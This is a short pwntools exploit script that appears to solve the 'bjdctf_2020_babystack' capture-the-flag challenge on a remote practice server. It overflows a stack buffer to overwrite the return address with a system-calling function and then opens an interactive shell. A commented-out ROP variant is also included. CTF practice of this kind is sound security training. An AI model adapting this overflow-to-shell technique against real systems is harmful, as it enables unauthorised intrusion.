from pwn import *

context.log_level = 'debug'

#io = process('./bjdctf_2020_babystack')
io = remote('node4.buuoj.cn',27668)
system_addr = 0x4006E6
payload = b'a' * (0x10 + 8) + p64(system_addr)
# payload = b'a' * 0x10 + p32(bin_sh) + p32(pop_rdi_ret) + p32(system_plt)
num = 100
io.recv()
io.sendline(b'100')
io.sendlineafter(b'name?',payload)
io.interactive()